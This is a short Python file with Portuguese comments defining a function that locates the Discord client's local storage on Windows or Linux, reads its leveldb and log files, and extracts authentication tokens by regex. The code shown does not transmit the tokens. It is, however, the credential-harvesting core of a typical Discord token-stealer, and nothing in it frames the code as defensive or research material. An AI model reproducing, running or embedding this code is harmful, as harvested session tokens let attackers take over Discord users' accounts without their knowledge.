import os
import glob
import re
import platform

def get_discord_token():
    """Tentar encontrar tokens do Discord em arquivos locais."""
    print("[INFO] Iniciando busca por tokens do Discord...")
    tokens = []
    discord_path = os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb") if platform.system() == "Windows" else os.path.expanduser("~/.config/discord/Local Storage/leveldb")
    print(f"[INFO] Caminho do Discord: {discord_path}")
    
    try:
        if not os.path.exists(discord_path):
            print(f"[ERRO] Diretório do Discord não encontrado: {discord_path}")
            return ["Nenhum token encontrado"]
        
        files = glob.glob(os.path.join(discord_path, "*.ldb")) + glob.glob(os.path.join(discord_path, "*.log"))
        print(f"[INFO] Arquivos encontrados: {files}")
        
        for file in files:
            print(f"[INFO] Lendo arquivo: {file}")
            with open(file, "r", errors="ignore") as f:
                content = f.read()
                found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                tokens.extend(found_tokens)
        return tokens if tokens else ["Nenhum token encontrado"]
    except Exception as e:
        print(f"[ERRO] Erro ao procurar tokens: {e}")
        return [f"Erro ao procurar tokens: {e}"]